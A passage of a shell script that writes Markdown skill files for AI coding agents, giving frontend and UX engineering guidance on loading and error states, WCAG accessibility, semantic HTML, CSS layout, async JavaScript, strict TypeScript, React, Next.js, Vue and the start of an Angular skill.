1. Differentiate between First-Time Empty (user has not created items yet) and Cleared/Filtered Empty (filters returned 0 results).
2. For First-Time Empty states, provide:
   - Clear contextual illustration or icon.
   - Explanatory heading and value proposition description.
   - Primary Call to Action (CTA) button directly launching creation.
3. For Filtered/Search Empty states, provide an immediate one-click 'Clear All Filters' action.
4. Replace blank loading screens and full-page spinners with structural skeleton loaders mirroring the expected content layout.
5. Error messages must follow the 3-part rule:
   - What happened (plain language, no unformatted stack traces or raw HTTP status codes).
   - Why it happened (contextual reason if known).
   - How to recover (retry button, alternative action, or support contact).
6. Implement optimistic UI updates with automatic rollback and non-blocking toast notifications on failure.

## Constraints / Rules
- Never show an empty, blank screen or an endless spinner with no timeout.
- Never display raw database errors, SQL queries, or internal stack traces to end-users in production.
- Do not disable user navigation when a sub-component encounters an error.

## Workflow
1. Identify all asynchronous boundaries within the component.
2. Define UI templates for: Initial Loading, Refreshing, No Data, No Search Matches, Network Error, and Authorization Error.
3. Implement localized Error Boundaries so an error in one card does not crash the entire application.
4. Add deterministic retry mechanisms with exponential backoff for transient failures.
5. Test behavior under simulated offline mode and 3G network conditions.

## Expected Output
Complete UI component specification or code implementing stateful branching for Loading, Empty, Error, and Populated states with action callbacks.

## Validation Checklist
- [ ] Is there an actionable CTA in first-time empty states?
- [ ] Can users reset filters with a single click on search empty states?
- [ ] Do error states clearly explain what went wrong and how to recover?
- [ ] Are skeleton loaders proportional to actual rendered content?
- [ ] Are errors contained within local boundaries without crashing parent views?

## Common Mistakes & Antipatterns
- Showing 'No items found' without giving the user a way to create an item.
- Displaying 'Something went wrong. Error 500' without a retry button or contact path.
- Using generic full-screen spinners that cause severe layout shift when content resolves.

## Concrete Real-World Example
Scenario: A customer dashboard project table crashes into a blank white screen when an API call times out.
Prompt: Refactor this project list view to handle loading, empty, and network error states gracefully.
Application: The AI implements a skeleton table with 5 animated placeholder rows during fetch, an empty illustration with a 'Create First Project' primary button when length is 0, and an inline error card with an exponential backoff 'Retry' button when HTTP 504 occurs.
EOF

cat << 'EOF' > skills/ux/accessibility/wcag-contrast-and-focus/SKILL.md
---
name: "wcag-contrast-and-focus"
description: "Engineering accessible web and mobile interfaces complying with WCAG 2.2 Level AA requirements for color contrast, visible focus indicators, and complete keyboard operability."
category: "ux"
subcategory: "accessibility"
language: "css"
framework: "none"
technology: "a11y-wcag"
difficulty: "intermediate"
tags: ["accessibility", "a11y", "wcag", "contrast", "keyboard-navigation", "focus"]
---

# WCAG 2.2 AA Contrast, Focus, and Keyboard Navigation

## Purpose
Provide developers and AI agents with precise engineering rules for meeting WCAG 2.2 Level AA compliance across visual styling, interactive focus states, and keyboard traps.

## When to Use
Use during UI design token creation, component implementation, design system development, and accessibility audits.

## Inputs / Context
Component DOM structure, color pairings, interactive elements, custom widgets (dialogs, dropdowns, tabs).

## Instructions
1. Ensure all standard text (< 18pt regular or < 14pt bold) satisfies a minimum contrast ratio of 4.5:1 against its background.
2. Ensure large text (>= 18pt regular or >= 14pt bold) and essential graphical UI components (borders of form inputs, icons) satisfy a minimum contrast ratio of 3.0:1.
3. Never remove CSS focus outlines (`outline: none` or `outline: 0`) without providing an equally prominent custom focus indicator (`:focus-visible`).
4. Ensure focus indicators have a contrast ratio of at least 3.0:1 against adjacent colors and a minimum perimeter thickness of 2px.
5. All interactive elements must be focusable and operable using the keyboard alone (Tab, Shift+Tab, Enter, Space, Escape, and Arrow keys).
6. Implement focus traps inside modal dialogs and slide-out drawers, returning focus to the triggering element upon closure.
7. Provide a 'Skip to main content' link as the first focusable element on web pages.
8. Maintain a logical tab order matching visual reading flow (avoid positive `tabindex`).

## Constraints / Rules
- Never use `tabindex` greater than 0 (`tabindex="1"` is prohibited).
- Never convey information using color alone (e.g., error fields must have text descriptions and icons in addition to red borders).
- Avoid trapping keyboard focus in any widget without a standard escape mechanism (`Escape` key).

## Workflow
1. Calculate color contrast ratios for all text, icon, and border pairings using the relative luminance formula.
2. Audit all interactive elements to verify they use native HTML elements (`<button>`, `<a>`, `<input>`) or correct ARIA roles and keyboard handlers.
3. Add global `:focus-visible` styles with high-contrast outlines and offsets (`outline-offset: 2px`).
4. Test keyboard-only navigation through the entire user flow: verify focus is always visually evident and never lost.
5. Verify modal dialogs capture focus on open and restore focus to trigger on close.

## Expected Output
Accessible CSS styles and HTML/ARIA component markup that fully passes automated Axe/Lighthouse accessibility audits with zero focus or contrast violations.

## Validation Checklist
- [ ] Do all standard text elements meet >= 4.5:1 contrast ratio?
- [ ] Is `:focus-visible` clearly styled with >= 2px high-contrast outline?
- [ ] Can all interactive components be operated using keyboard alone?
- [ ] Is keyboard focus trapped inside open modals and returned to trigger on close?
- [ ] Is there an accessible 'Skip to content' link at the top of the page?

## Common Mistakes & Antipatterns
- Stripping focus rings with `* { outline: none; }` to satisfy aesthetic preferences.
- Using light gray text (`#94a3b8`) on white backgrounds (`#ffffff`), failing the 4.5:1 threshold (yields 2.6:1).
- Building custom `<div>` buttons without `role="button"`, `tabindex="0"`, and `onKeyDown` listeners for Space and Enter.

## Concrete Real-World Example
Scenario: A custom dropdown menu styled with `div` tags that cannot be focused with Tab and uses light gray text.
Prompt: Make this custom dropdown component fully WCAG 2.2 AA compliant for keyboard navigation and contrast.
Application: The AI converts the container into a `<button>` with `aria-haspopup="listbox"` and `aria-expanded`, sets focus rings using `:focus-visible { outline: 2px solid #2563eb; outline-offset: 2px; }`, elevates text contrast from 2.8:1 to 5.4:1, and implements ArrowDown/ArrowUp keyboard navigation.
EOF

cat << 'EOF' > skills/frontend/html/semantic-markup-and-metadata/SKILL.md
---
name: "semantic-markup-and-metadata"
description: "Authoring standards-compliant, semantic HTML5 document structures with robust Open Graph, Twitter Cards, JSON-LD structured data, and accessibility landmarks."
category: "frontend"
subcategory: "html"
language: "html"
framework: "none"
technology: "html5"
difficulty: "beginner"
tags: ["frontend", "html", "semantic-html", "seo", "open-graph", "structured-data", "metadata"]
---

# Semantic HTML5 Architecture and Document Metadata

## Purpose
Instruct AI agents to generate structured, accessible, and search-optimized HTML documents adhering to W3C specifications and modern search engine indexing standards.

## When to Use
Use when creating base page templates, public marketing pages, blog post layouts, or refactoring tag-soup markup dominated by generic <div> and <span> elements.

## Inputs / Context
Document content hierarchy, page title, canonical URL, social share assets, and primary entities represented on the page.

## Instructions
1. Structure root document using correct doctype (`<!DOCTYPE html>`), valid `lang` attribute on `<html>`, and essential `<head>` metadata (`charset="utf-8"`, viewport meta, canonical link).
2. Utilize native HTML5 structural landmarks: `<header>`, `<nav>`, `<main>`, `<article>`, `<section>`, `<aside>`, and `<footer>`.
3. Restrict each document to exactly one `<h1>` element representing the primary topic of the page; maintain strict linear heading hierarchy (`h2` followed by `h3`, never skipping levels).
4. Integrate complete Open Graph (`og:title`, `og:description`, `og:image`, `og:url`, `og:type`) and Twitter Card (`twitter:card`, `twitter:site`) meta tags.
5. Embed Schema.org JSON-LD structured data (`<script type="application/ld+json">`) for rich snippets (e.g., Article, Organization, BreadcrumbList, SoftwareApplication).
6. Ensure all media elements (`<img>`, `<video>`, `<audio>`) include descriptive `alt` attributes or appropriate accessibility fallback attributes (`aria-hidden="true"` for decorative graphics).
7. Optimize resource hints: use `rel="preconnect"` and `rel="dns-prefetch"` for critical third-party domains, and `rel="preload"` for primary above-the-fold fonts/images.

## Constraints / Rules
- Never nest `<main>` inside `<article>`, `<section>`, or `<nav>`; a document must have only one visible `<main>` landmark.
- Do not use `<div>` or `<span>` when a semantic native element (`<button>`, `<dialog>`, `<details>`, `<summary>`, `<time>`) exists.
- Never omit the `alt` attribute on `<img>` tags.

## Workflow
1. Define document metadata and social graph configuration.
2. Outline page content into semantic landmarks (`nav`, `main`, `aside`, `footer`).
3. Construct the content hierarchy within `<main>` using heading tags and semantic sectioning.
4. Inject structured JSON-LD schema matching page content.
5. Validate via W3C Nu HTML Checker and Google Rich Results Test standards.

## Expected Output
Clean, standards-compliant HTML5 document template with complete head metadata, Schema.org JSON-LD markup, and native landmark structure.

## Validation Checklist
- [ ] Does the document contain exactly one `<h1>`?
- [ ] Are headings nested sequentially without skipping levels?
- [ ] Are native landmarks (`main`, `nav`, `header`, `footer`) properly structured?
- [ ] Does the document include valid Open Graph and canonical tags?
- [ ] Is Schema.org JSON-LD embedded and syntactically valid JSON?

## Common Mistakes & Antipatterns
- Building clickable cards using `<div>` with `onClick` instead of an accessible anchor tag `<a>` or `<button>`.
- Using `<section>` as a generic styling wrapper instead of a thematic grouping with its own heading.
- Skipping heading levels (e.g., jumping directly from `<h1>` to `<h3>` for styling purposes).

## Concrete Real-World Example
Scenario: Refactoring a generic React landing page composed entirely of nested `div` containers and missing meta tags.
Prompt: Convert this landing page structure into semantic HTML5 with complete SEO and social metadata.
Application: The AI wraps navigation in `<nav>`, main content in `<main>`, product features in `<section>` with `<h2>` headers, customer quotes in `<figure>` and `<blockquote>`, adds JSON-LD Organization schema, and populates Open Graph tags.
EOF

cat << 'EOF' > skills/frontend/css/modern-layout-grid-flex/SKILL.md
---
name: "modern-layout-grid-flex"
description: "Architecting resilient, responsive layouts leveraging modern CSS features including CSS Grid, Flexbox, subgrid, aspect-ratio, and logical properties."
category: "frontend"
subcategory: "css"
language: "css"
framework: "none"
technology: "css"
difficulty: "intermediate"
tags: ["frontend", "css", "grid", "flexbox", "subgrid", "logical-properties", "layout"]
---

# Modern CSS Layout Architecture with Grid and Flexbox

## Purpose
Provide deterministic design patterns for implementing clean, responsive multi-column layouts, nested card grids, and navigation rails without layout hacks or external CSS frameworks.

## When to Use
Use when designing application dashboards, data grids, magazine-style layouts, card decks, or responsive app shells.

## Inputs / Context
Layout wireframe, visual rhythm requirements, dynamic content constraints, and multi-language/RTL requirements.

## Instructions
1. Use CSS Grid for two-dimensional layouts (both rows and columns simultaneously) and Flexbox for one-dimensional layouts (row or column).
2. Utilize `repeat(auto-fit, minmax(min(100%, 300px), 1fr))` for intrinsically responsive card grids that automatically wrap without media queries.
3. Leverage CSS `subgrid` on nested grid items to inherit row/column track alignments from the parent grid, aligning card headers, bodies, and footers across rows.
4. Replace physical properties (`left`, `right`, `top`, `bottom`) with CSS Logical Properties (`inline-start`, `inline-end`, `block-start`, `block-end`, `margin-inline`, `padding-block`) to support bidirectional and RTL languages.
5. Use the modern `aspect-ratio` property to prevent Cumulative Layout Shift (CLS) on dynamic image and video containers.
6. Manage spacing consistently using CSS Grid/Flexbox `gap` rather than cascading child margins.
7. Use `min-width: 0` or `min-height: 0` on flex/grid items to prevent flex/grid item overflow caused by long strings or code snippets.

## Constraints / Rules
- Never use float-based layouts or table-based layout hacks.
- Avoid setting rigid fixed heights on text-containing elements; allow intrinsic content expansion.
- Do not mix CSS Grid and Flexbox haphazardly on the same container element.

## Workflow
1. Decompose the viewport into major structural regions (sidebar, header, content, ancillary panel).
2. Define the outer page grid with `grid-template-areas` or track definitions.
3. Implement component internal layouts using Flexbox or nested subgrids.
4. Apply logical margins, paddings, and alignment properties (`justify-content`, `align-items`).
5. Validate rendering across extreme content variations (empty content, 500-character usernames, high-resolution media).

## Expected Output
Clean, modular CSS rules using CSS Grid, subgrid, flexbox gap, and logical properties, free of media-query clutter and layout hacks.

## Validation Checklist
- [ ] Does the grid wrap dynamically across viewports without horizontal scrolling?
- [ ] Are card footers and headers aligned using `subgrid` or flex column push?
- [ ] Are logical properties used for margins, paddings, and borders?
- [ ] Is `aspect-ratio` applied to media containers to prevent CLS?
- [ ] Do flex/grid items include `min-width: 0` to prevent text blowout?

## Common Mistakes & Antipatterns
- Using `margin-right` instead of `margin-inline-end`, breaking layouts when switched to Arabic or Hebrew (RTL).
- Attempting to force Flexbox into a 2D grid using brittle percentage widths and negative margins.
- Forgetting `min-width: 0` on flex children, resulting in uncontainable horizontal scrolling when displaying code blocks or URLs.

## Concrete Real-World Example
Scenario: A dashboard card grid where varying description lengths cause action buttons at the bottom of cards to be misaligned.
Prompt: Align the buttons across cards in this multi-column grid without fixing card heights.
Application: The AI configures the card grid with `display: grid; grid-template-rows: subgrid; grid-row: span 3;` allowing the header, body, and button footer of every card to lock to shared row tracks across the entire grid.
EOF

cat << 'EOF' > skills/frontend/javascript/async-event-loop-patterns/SKILL.md
---
name: "async-event-loop-patterns"
description: "Mastering asynchronous JavaScript execution, event loop mechanics, microtask scheduling, concurrency control, and cancellation via AbortController."
category: "frontend"
subcategory: "javascript"
language: "javascript"
framework: "none"
technology: "vanilla-js"
difficulty: "advanced"
tags: ["frontend", "javascript", "async", "event-loop", "abortcontroller", "concurrency", "promises"]
---

# Asynchronous JavaScript and Event Loop Resilience

## Purpose
Guide AI in writing production-grade asynchronous JavaScript that manages race conditions, controls concurrency, handles errors exhaustively, and avoids main-thread starvation.

## When to Use
Use when implementing API clients, background data sync, debounced search auto-completes, batched queue processors, or complex DOM interaction sequences.

## Inputs / Context
Asynchronous task specifications, rate limit constraints, network latency parameters, and cancelation requirements.

## Instructions
1. Always utilize `AbortController` and `AbortSignal` for cancellable asynchronous operations (fetch requests, timeouts, long-running event listeners).
2. Distinguish between macrotask (`setTimeout`, `setInterval`, I/O) and microtask (`Promise.then`, `queueMicrotask`, `MutationObserver`) scheduling queues to avoid unexpected state execution order.
3. Prevent memory leaks and unhandled rejections by wrapping async workflows in structured `try/catch/finally` blocks and pairing event listeners with cleanup handlers.
4. Implement concurrency limiters (e.g., `p-limit` pattern) when executing parallel promises via `Promise.all` or `Promise.allSettled` to prevent overwhelming network sockets or thread pools.
5. Use `Promise.allSettled()` instead of `Promise.all()` when individual subtask failures should not abort the entire batch.
6. Avoid blocking the browser main thread: offload computationally intensive loops (> 50ms) to Web Workers or yield control using `scheduler.yield()` / `setTimeout(..., 0)`.
7. Debounce and throttle high-frequency events (`scroll`, `resize`, `input`) with trailing and leading edge configuration options.

## Constraints / Rules
- Never write unbounded `Promise.all()` over arbitrary-length user-supplied arrays.
- Never swallow errors silently in Promise catch handlers without logging or telemetry.
- Avoid the `async` executor antipattern in `new Promise(async (resolve, reject) => ...)`; handle asynchronous resolution strictly inside normal promise chains.

## Workflow
1. Define the asynchronous operation lifecycle: trigger, in-flight, success, error, cancellation.
2. Initialize an `AbortController` instance and pass its signal to all underlying fetch calls or timers.
3. Structure concurrency limits and retry strategies with jittered exponential backoff.
4. Provide immediate cancellation upon component unmount or subsequent query entry.
5. Verify event loop non-blocking behavior under heavy payload processing.

## Expected Output
Robust, modern asynchronous JavaScript modules with explicit abort handling, bounded concurrency, and defensive error propagation.

## Validation Checklist
- [ ] Are all in-flight network requests cancelled when superseded or unmounted?
- [ ] Is concurrency bounded when executing batches of async tasks?
- [ ] Is `Promise.allSettled` utilized where partial batch success is acceptable?
- [ ] Does heavy computation yield to the browser event loop to preserve 60fps responsiveness?
- [ ] Are all promise rejections handled without crashing the runtime?

## Common Mistakes & Antipatterns
- Failing to abort previous search requests in typeahead autocomplete inputs, leading to race conditions where older requests overwrite newer results.
- Unhandled promise rejection when an aborted fetch throws `AbortError`; code must explicitly check `error.name === 'AbortError'`.
- Running CPU-bound data parsing on the main UI thread causing page freezes.

## Concrete Real-World Example
Scenario: An autocomplete search box sends requests on every keystroke, resulting in race conditions where stale network responses overwrite recent queries.
Prompt: Fix this search autocomplete function to prevent race conditions and excessive API calls.
Application: The AI implements a debounce wrapper, instantiates an `AbortController` on each keystroke to abort prior pending HTTP requests, ignores `AbortError` in the catch clause, and handles UI loading states deterministically.
EOF

cat << 'EOF' > skills/frontend/typescript/strict-type-contracts/SKILL.md
---
name: "strict-type-contracts"
description: "Designing expressive, compile-time verified domain models and API contracts using TypeScript strict mode, discriminated unions, branded types, and type guards."
category: "frontend"
subcategory: "typescript"
language: "typescript"
framework: "none"
technology: "typescript"
difficulty: "advanced"
tags: ["frontend", "typescript", "type-safety", "discriminated-unions", "branded-types", "type-guards"]
---

# Strict TypeScript Domain Modeling and Type Contracts

## Purpose
Direct AI models to construct foolproof type definitions that make illegal states unrepresentable, eliminate `any` types, and ensure end-to-end type safety across the frontend stack.

## When to Use
Use when designing domain models, typing state management stores, writing SDKs, declaring API contracts, or refactoring loosely typed JavaScript into strict TypeScript.

## Inputs / Context
Domain entities, business rules, API payload schemas, possible error modes, and state lifecycle transitions.

## Instructions
1. Enable strict mode in `tsconfig.json` (`strict: true`, `noImplicitAny: true`, `strictNullChecks: true`, `noUncheckedIndexedAccess: true`).
2. Model polymorphic data and state machines using Discriminated Unions with a single shared discriminant property (e.g., `type: 'idle' | 'loading' | 'success' | 'error'`).
3. Make illegal states unrepresentable: never combine optional properties that must exist together (e.g., `{ data?: Data; error?: Error; isLoading: boolean }` is an antipattern; use a discriminated union instead).
4. Utilize Branded Types (nominal typing) for primitive identifiers (e.g., `type UserId = string & { readonly __brand: unique symbol }`) to prevent passing a `CompanyId` where a `UserId` is expected.
5. Implement custom Type Guards (`value is TargetType`) and assertion functions (`asserts condition`) to narrow types safely at runtime boundaries.
6. Use `unknown` instead of `any` for incoming untrusted data (e.g., JSON parsing, API responses) and validate using runtime schema parsers (such as Zod) before type casting.
7. Leverage `satisfies` operator to validate that an expression matches a type contract without widening the inferred literal types.

## Constraints / Rules
- Never use `any` unless explicitly wrapping untyped third-party legacy libraries with documented justification.
- Avoid non-null assertions (`!`) unless immediately following a verified condition that the compiler cannot infer.
- Never use TypeScript `enum`; prefer `const` objects with `as const` and indexed access types (`typeof MY_ENUM[keyof typeof MY_ENUM]`).

## Workflow
1. Identify core domain entities and their invariant relationships.
2. Define primitive branded types for IDs and validated scalars.
3. Formulate state representations as discriminated union records.
4. Build user-defined type guards and runtime validation boundaries.
5. Verify compiler diagnostic output under `tsc --noEmit`.

## Expected Output
Strict, clean TypeScript types, branded primitives, and discriminated unions with zero `any` declarations and exhaustive switch-case handling.

## Validation Checklist
- [ ] Is `noUncheckedIndexedAccess` satisfied for dynamic property lookups?
- [ ] Are all asynchronous UI states modeled as discriminated unions?
- [ ] Are nominal types used to distinguish domain entity IDs?
- [ ] Are runtime boundaries validated from `unknown` rather than cast via `as`?
- [ ] Does `tsc --noEmit` pass with zero type errors?

## Common Mistakes & Antipatterns
- Declaring state as `{ isLoading: boolean, data?: User, error?: Error }`, allowing nonsensical states like `{ isLoading: true, error: Error }`.
- Using `as unknown as MyType` type assertions to bypass compiler errors instead of fixing structural incompatibilities.
- Using TypeScript numeric enums which emit reverse-mapping objects into JavaScript bundles.

## Concrete Real-World Example
Scenario: A payment processing module has subtle runtime crashes because customer IDs, transaction IDs, and invoice IDs (all strings) are accidentally passed into the wrong API parameters.
Prompt: Refactor this payment module's types to prevent parameter transposition bugs and make state transitions type-safe.
Application: The AI creates nominal branded types (`CustomerId`, `TransactionId`), models payment state as a discriminated union (`PendingPayment`, `AuthorizedPayment`, `FailedPayment`), and creates exhaustive pattern matching functions using `never` check.
EOF

cat << 'EOF' > skills/frontend/react/component-architecture/SKILL.md
---
name: "component-architecture"
description: "Building modular, high-performance React components utilizing Compound Components, custom hooks, proper state collocation, and clean dependency management."
category: "frontend"
subcategory: "react"
language: "typescript"
framework: "react"
technology: "react"
difficulty: "intermediate"
tags: ["frontend", "react", "hooks", "compound-components", "state-collocation", "architecture"]
---

# React Component Architecture and Clean State Composition

## Purpose
Provide concrete guidelines for authoring reusable, maintainable React components that avoid prop drilling, unnecessary re-renders, and brittle lifecycle synchronization.

## When to Use
Use when creating reusable design system components (selects, accordions, dialogs), building complex interactive forms, or modularizing bloated monolith components.

## Inputs / Context
Component specification, visual design, user interaction requirements, and shared application context.

## Instructions
1. Structure complex interactive UI using the Compound Component pattern (e.g., `<Select>`, `<Select.Trigger>`, `<Select.List>`, `<Select.Option>`) sharing state via Context.
2. Collocate state: keep state as close as possible to the components that consume it. Do not hoist state to parent components unless multiple siblings require synchronization.
3. Extract reusable stateful logic into focused custom hooks (e.g., `useControllableState`, `useMediaQuery`, `useDebounce`).
4. Support both controlled and uncontrolled operation modes for form components via a unified value/defaultValue API.
5. Memoize callbacks (`useCallback`) and expensive calculations (`useMemo`) only when passing them to memoized children (`React.memo`) or as hook dependencies; avoid premature memoization of trivial operations.
6. Strictly separate container/logic hooks from presentational markup components.
7. Always clean up subscriptions, event listeners, and timers in `useEffect` return functions.
8. Treat props as immutable; never mutate arrays or objects directly when updating component state.

## Constraints / Rules
- Never use `useEffect` for data transformation that can be computed synchronously during render (`const fullName = firstName + ' ' + lastName`).
- Avoid prop drilling through more than two intermediate component layers; use Context or Component Composition (`children` prop).
- Do not suppress the `react-hooks/exhaustive-deps` ESLint rule without documented justification.

## Workflow
1. Determine component boundary and public API interface.
2. Implement internal Context for compound component coordination.
3. Extract interaction logic into a custom hook.
4. Build child subcomponents and assign them as static properties.
5. Verify keyboard navigation, accessibility attributes, and unmount cleanup.

## Expected Output
Clean TypeScript React component implementation supporting composition, custom styling, full accessibility, and zero redundant re-renders.

## Validation Checklist
- [ ] Can the component be composed flexibly using child compound components?
- [ ] Is state collocated to prevent unnecessary tree re-renders?
- [ ] Are all `useEffect` dependencies exhaustively declared?
- [ ] Is cleanup handled properly on component unmount?
- [ ] Does the component support both controlled and uncontrolled states?

## Common Mistakes & Antipatterns
- Using `useEffect` to synchronize state between props and internal state, causing double renders and race conditions.
- Hoisting all state into a global store (Redux/Zustand) when only a single component sub-tree requires it.
- Wrapping every single inline function in `useCallback` even when passing to standard DOM elements like `<button onClick={...}>`.

## Concrete Real-World Example
Scenario: A monolithic 800-line `<Modal>` component with 25 props that handles header, footer, body, confirmation steps, and styling variants in a rigid template.
Prompt: Refactor this monolithic modal component into a flexible Compound Component architecture.
Application: The AI defines `<Dialog>`, `<Dialog.Trigger>`, `<Dialog.Content>`, `<Dialog.Header>`, and `<Dialog.Close>`, coordinates open state and keyboard traps via `DialogContext`, and provides clean slot-based composition.
EOF

cat << 'EOF' > skills/frontend/nextjs/app-router-server-components/SKILL.md
---
name: "app-router-server-components"
description: "Architecting Next.js applications using App Router conventions, React Server Components (RSC), Client Component boundaries, Server Actions, and granular streaming."
category: "frontend"
subcategory: "nextjs"
language: "typescript"
framework: "nextjs"
technology: "react-server-components"
difficulty: "advanced"
tags: ["frontend", "nextjs", "app-router", "rsc", "server-actions", "streaming", "ssr"]
---

# Next.js App Router and Server Component Boundaries

## Purpose
Instruct AI agents to properly partition Next.js App Router applications between Server Components and Client Components, optimizing bundle size, performance, and data security.

## When to Use
Use when architecting Next.js 14+ or 15+ applications, building data-heavy dashboard routes, handling form submissions via Server Actions, or optimizing Core Web Vitals.

## Inputs / Context
Page requirements, data fetching dependencies, interactive elements (event handlers, state), and cache revalidation strategies.

## Instructions
1. Default all components to React Server Components (RSC); introduce `'use client'` only at the leaves of the component tree where interactivity (hooks, event listeners) is required.
2. Fetch data directly inside Server Components using async/await without `useEffect` or client-side fetch libraries.
3. Pass Server Components as `children` or props to Client Components to avoid forcing server-side subtrees into client bundles.
4. Implement mutations using Server Actions (`'use server'`) with input validation via Zod and optimistic updates via `useOptimistic`.
5. Revalidate cached data deterministically using `revalidatePath()` or `revalidateTag()`.
6. Wrap slow data-fetching Server Components in `<Suspense fallback={<Skeleton />}>` to enable streaming server rendering (PPR/SSR).
7. Guard sensitive server-only code (database queries, secret keys) using the `server-only` package to prevent accidental client leakage.
8. Use Next.js route handlers (`app/api/.../route.ts`) exclusively for external webhooks and public third-party APIs; use Server Actions for internal UI mutations.

## Constraints / Rules
- Never mark an entire page or layout with `'use client'` simply to use a single interactive button or input.
- Never pass sensitive credentials or private server entities directly as props to Client Components.
- Do not import database clients or server secrets into files marked with `'use client'`.

## Workflow
1. Analyze the route UI and map data requirements vs interactive client requirements.
2. Create the layout and page as async Server Components fetching data in parallel.
3. Identify interactive boundaries (like a search input or favorite button) and isolate them into dedicated `'use client'` files.
4. Wrap async data components in `<Suspense>` boundaries with skeleton placeholders.
5. Create Server Actions for state mutations with schema validation and cache revalidation.

## Expected Output
High-performance Next.js App Router structure with clean client/server separation, minimal client JavaScript bundles, and streaming suspense fallbacks.

## Validation Checklist
- [ ] Are Server Components utilized by default across all layouts and pages?
- [ ] Is `'use client'` pushed to the absolute leaves of the component tree?
- [ ] Are async boundaries wrapped in `<Suspense>` with responsive fallbacks?
- [ ] Are Server Actions validated using a runtime schema validator (Zod)?
- [ ] Is sensitive backend code protected with `import 'server-only'`?

## Common Mistakes & Antipatterns
- Adding `'use client'` at the top of a page file to handle a single button click, unnecessarily bundling all child components into client JS.
- Passing full database entity models (including hashed passwords or internal metadata) as props to Client Components.
- Fetching data in client components using `useEffect` instead of leveraging async Server Components.

## Concrete Real-World Example
Scenario: A slow Next.js dashboard route takes 3 seconds to load because it waits for multiple sequential database queries before rendering anything.
Prompt: Optimize this Next.js dashboard using App Router streaming and Server Component boundaries.
Application: The AI converts the page into an async Server Component, triggers independent database queries in parallel wrapped in separate `<Suspense>` boundaries with skeleton loaders, extracts the interactive filter dropdown into a leaf `'use client'` component, and implements instant initial HTML delivery.
EOF

cat << 'EOF' > skills/frontend/vue/composition-api-architecture/SKILL.md
---
name: "composition-api-architecture"
description: "Developing robust Vue 3 applications utilizing `<script setup>`, TypeScript, composables, provide/inject dependency injection, and Pinia store modules."
category: "frontend"
subcategory: "vue"
language: "typescript"
framework: "vue"
technology: "vue3"
difficulty: "intermediate"
tags: ["frontend", "vue", "vue3", "composition-api", "pinia", "composables"]
---

# Vue 3 Composition API and Pinia Store Architecture

## Purpose
Provide standard guidelines for engineering scalable Vue 3 applications using single-file components with script setup, modular composables, and type-safe state stores.

## When to Use
Use when developing Vue 3 enterprise applications, refactoring Vue 2 Options API code, or building reusable composables.

## Inputs / Context
Component wireframe, state requirements, reactivity dependencies, and API integration specifications.

## Instructions
1. Standardize on Single File Components (SFC) with `<script setup lang="ts">`.
2. Define typed props and emits using `defineProps<Props>()` and `defineEmits<Emits>()` compiler macros.
3. Structure shared stateful logic into focused composables (e.g., `useFetch`, `useWindowScroll`) named with the `use` prefix, returning explicit reactive refs and functions.
4. Use `ref()` for primitive values and arrays; use `reactive()` only when grouping cohesive object properties that are never destructured directly.
5. Use `toRefs()` or `toRef()` when destructuring reactive objects or props to maintain reactivity.
6. Manage global application state using Pinia setup stores (`defineStore('id', () => { ... })`) rather than legacy Options API stores.
7. Use `watchEffect()` for reactive side effects and `watch()` with explicit source getters (`() => state.property`) for granular change detection.
8. Avoid deep component prop drilling by utilizing Vue's typed `provide` and `inject` with `InjectionKey<T>` symbols.

## Constraints / Rules
- Never destructure props directly inside `<script setup>` without `toRefs` or the reactivity transform compiler macro, as this loses reactivity.
- Avoid mutating props directly inside child components; always emit events to parent owners.
- Do not mix legacy Options API (`data`, `methods`, `computed`) with Composition API in the same component.

## Workflow
1. Declare component interface with typed props, emits, and slots.
2. Implement reactive local state using `ref` and `computed`.
3. Extract reusable state logic into external composable functions.
4. Connect shared domain state via Pinia setup stores.
5. Verify template reactivity and lifecycle cleanup (`onUnmounted`).

## Expected Output
Clean Vue 3 SFC with `<script setup lang="ts">`, typed compiler macros, extracted composables, and strict Pinia store integration.

## Validation Checklist
- [ ] Are props and emits typed using TypeScript interfaces in `defineProps` and `defineEmits`?
- [ ] Is reactivity preserved when destructuring reactive objects?
- [ ] Are global stores implemented using Pinia setup store syntax?
- [ ] Are event listeners and timers cleaned up inside `onUnmounted`?
- [ ] Are provide/inject keys typed using `InjectionKey<T>`?

## Common Mistakes & Antipatterns
- Destructuring props: `const { count } = defineProps<{ count: number }>()`, breaking Vue's reactive tracking.
- Mutating Pinia store state directly in components without calling store actions for complex business transitions.
- Using `ref` where `computed` is appropriate, resulting in manual synchronization bugs.

## Concrete Real-World Example
Scenario: A large Vue 2 Options API user profile editor with scattered `watch` and `methods` declarations that is hard to test and maintain.
Prompt: Refactor this Options API profile component into Vue 3 `<script setup lang="ts">` with a custom `useProfileForm` composable.
Application: The AI creates a type-safe composable handling validation, change tracking, and API sync, rewrites the component using `<script setup>`, and declares typed props and emits.
EOF

cat << 'EOF' > skills/frontend/angular/signals-standalone-components/SKILL.md
---
name: "signals-standalone-components"
description: "Architecting enterprise Angular applications using Standalone Components, reactive Signals, inject-based dependency injection, and OnPush change detection."
category: "frontend"
subcategory: "angular"
language: "typescript"
framework: "angular"
technology: "angular"
difficulty: "advanced"
tags: ["frontend", "angular", "signals", "standalone-components", "inject", "onpush"]
---

# Modern Angular Architecture with Standalone Components and Signals

## Purpose
Instruct AI agents to author modern, performant Angular applications (v16+) leveraging fine-grained reactivity with Signals and eliminating unnecessary NgModules.

## When to Use
Use when creating new Angular features, modernizing legacy NgModule architectures, or optimizing change detection performance.

## Inputs / Context
Feature specifications, routing needs, state model, and API service dependencies.

## Instructions
1. Declare all components, directives, and pipes as standalone (`standalone: true`); eliminate `NgModule` dependencies.
2. Manage reactive state using Angular Signals (`signal()`, `computed()`, and `effect()`) for fine-grained, glitch-free reactivity.
3. Configure change detection strategy to `ChangeDetectionStrategy.OnPush` on all components.
4. Use the functional `inject(Service)` function for dependency injection in constructors and field initializers instead of bloated constructor parameter lists.
5. Utilize the new control flow syntax (`@if`, `@for`, `@switch`) in templates, replacing legacy structural directives (`*ngIf`, `*ngFor`).
6. Always supply a unique `track` expression in `@for` loops (e.g., `@for (item of items(); track item.id)`).
7. Interoperate between RxJS observables and Signals using `toSignal()` and `toObservable()` from `@angular/core/rxjs-interop`.
8. Enforce strong input and output typing using `input()` and `output()` signal-based APIs.

## Constraints / Rules
- Never leave components on `ChangeDetectionStrategy.Default` in enterprise applications.
- Never write side-effects or state mutations inside `computed()` signals; computations must remain pure.
- Avoid manual RxJS `.subscribe()` calls in components; use `toSignal()` or the `async` pipe.

## Workflow
1. Define component as `standalone: true` with required imports listed directly.
2. Set `changeDetection: ChangeDetectionStrategy.OnPush`.
3. Declare reactive state using `signal()` and derived values via `computed()`.
